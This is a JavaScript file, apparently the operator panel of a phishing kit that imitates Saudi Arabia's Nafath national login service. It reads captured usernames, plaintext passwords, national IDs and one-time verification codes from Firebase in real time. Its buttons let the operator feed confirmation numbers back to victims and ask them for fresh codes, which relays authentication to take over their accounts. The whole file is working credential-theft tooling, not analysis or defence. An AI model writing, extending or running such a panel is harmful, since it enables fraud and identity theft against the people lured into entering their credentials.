import { db } from "./firebase-config.js";
import { 
    collection, 
    onSnapshot,
    doc,
    updateDoc
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', () => {
    const logsTableBody = document.getElementById('logsTableBody');
    const codeModal = document.getElementById('codeModal');
    const confirmationCodeInput = document.getElementById('confirmationCodeInput');
    const submitCodeBtn = document.getElementById('submitCodeBtn');
    const closeModalBtn = document.getElementById('closeModalBtn');

    let allLogs = {};
    let currentTargetDoc = { id: "", type: "" }; 

    function renderTable() {
        logsTableBody.innerHTML = "";
        const sortedLogs = Object.values(allLogs).sort((a,b) => (b.timestamp?.toMillis() || 0) - (a.timestamp?.toMillis() || 0));

        if(sortedLogs.length === 0) {
            logsTableBody.innerHTML = `<tr><td colspan="6" style="text-align:center;">لا توجد طلبات حالياً...</td></tr>`;
            return;
        }

        sortedLogs.forEach((log) => {
            const row = document.createElement('tr');
            
            // تحديد نص الحالة واللون المناسب لها بشكل ديناميكي
            let statusText = log.status;
            let statusClass = "action-done"; 

            if (log.status === "waiting_admin") {
                statusText = "بانتظار الأدمن";
                statusClass = "waiting";
            } else if (log.status === "applied_success") {
                statusText = "تم التقديم بنجاح";
                statusClass = "status-success";
            } else if (log.status === "show_code") {
                statusText = `تم إرسال كود (${log.verificationCode || ''})`;
                statusClass = "status-code";
            } else if (log.status === "request_new_code") {
                statusText = "بانتظار كود آخر من العميل";
                statusClass = "status-waiting-new";
            } else if (log.status === "wrong_national_id") {
                statusText = "هوية غير صحيحة";
                statusClass = "status-wrong";
            } else if (log.status === "wrong_auth_data") {
                statusText = "حساب غير صحيح";
                statusClass = "status-wrong";
            }

            // فحص وتنسيق ظهور الكود الثاني المستلم من المستخدم
            const secondaryCodeDisplay = log.secondaryVerificationCode ? 
                `<strong style="color: #6b21a8; font-size: 16px; background: #f3e8ff; padding: 4px 12px; border-radius: 4px; border: 1px dashed #b55fe6; font-family: monospace;">${log.secondaryVerificationCode}</strong>` 
                : `<span style="color: #bbb; font-style: italic;">بانتظار الإرسال...</span>`;

            // أزرار التحكم والإجراءات الديناميكية
            const actionButtons = `
                <button class="btn-action btn-code" data-id="${log.id}" data-type="${log.type}">رقم تأكيد</button>
                <button class="btn-action btn-new-code" data-id="${log.id}" data-type="${log.type}">طلب كود آخر</button>
                <button class="btn-action btn-wrong-id" data-id="${log.id}" data-type="${log.type}">هوية غير صحيحة</button>
                <button class="btn-action btn-wrong-pass" data-id="${log.id}" data-type="${log.type}">حساب غير صحيح</button>
                <button class="btn-action btn-applied" data-id="${log.id}" data-type="${log.type}">تم التقديم</button>
            `;

            if (log.type === "app_request") {
                row.innerHTML = `
                    <td><span class="type-badge type-app">تطبيق نفاذ</span></td>
                    <td><strong>${log.nationalId || '---'}</strong></td>
                    <td style="color:#95a5a6; font-style:italic;">---</td>
                    <td style="text-align: center;">${secondaryCodeDisplay}</td>
                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                    <td>${actionButtons}</td>
                `;
            } else {
                row.innerHTML = `
                    <td><span class="type-badge type-pass">اسم مستخدم</span></td>
                    <td><strong>${log.username || '---'}</strong></td>
                    <td style="color:#c0392b; font-family:monospace;">${log.password || '---'}</td>
                    <td style="text-align: center;">${secondaryCodeDisplay}</td>
                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                    <td>${actionButtons}</td>
                `;
            }
            logsTableBody.appendChild(row);
        });
    }

    // الاستماع لنقرات الأزرار داخل الجدول بالتفويض الإجرائي الفوري
    logsTableBody.addEventListener('click', async (e) => {
        if (!e.target.classList.contains('btn-action')) return;

        const id = e.target.getAttribute('data-id');
        const type = e.target.getAttribute('data-type');
        const collectionName = type === "app_request" ? "nafath_app_requests" : "users_login";
        const docRef = doc(db, collectionName, id);

        if (e.target.classList.contains('btn-code')) {
            currentTargetDoc = { id, type };
            codeModal.style.display = "flex";
            confirmationCodeInput.focus();
        } else if (e.target.classList.contains('btn-new-code')) {
            await updateDoc(docRef, { status: "request_new_code" });
        } else if (e.target.classList.contains('btn-wrong-id')) {
            await updateDoc(docRef, { status: "wrong_national_id" });
        } else if (e.target.classList.contains('btn-wrong-pass')) {
            await updateDoc(docRef, { status: "wrong_auth_data" });
        } else if (e.target.classList.contains('btn-applied')) {
            await updateDoc(docRef, { status: "applied_success" });
        }
    });

    // إرسال كود التأكيد الأول للفايربيس
    submitCodeBtn.addEventListener('click', async () => {
        const codeValue = confirmationCodeInput.value.trim();
        if(!codeValue) return;

        const collectionName = currentTargetDoc.type === "app_request" ? "nafath_app_requests" : "users_login";
        const docRef = doc(db, collectionName, currentTargetDoc.id);

        await updateDoc(docRef, { 
            status: "show_code",
            verificationCode: codeValue 
        });

        codeModal.style.display = "none";
        confirmationCodeInput.value = "";
    });

    closeModalBtn.addEventListener('click', () => { codeModal.style.display = "none"; });

    // الاستماع اللحظي للمجموعتين من الفايربيس وتحديث الجدول فوراً عند استلام الكود الجديد
    onSnapshot(collection(db, "users_login"), (s) => { 
        s.forEach(d => allLogs[d.id] = {id:d.id, type:"user_login", ...d.data()}); 
        renderTable(); 
    });
    
    onSnapshot(collection(db, "nafath_app_requests"), (s) => { 
        s.forEach(d => allLogs[d.id] = {id:d.id, type:"app_request", ...d.data()}); 
        renderTable(); 
    });
});
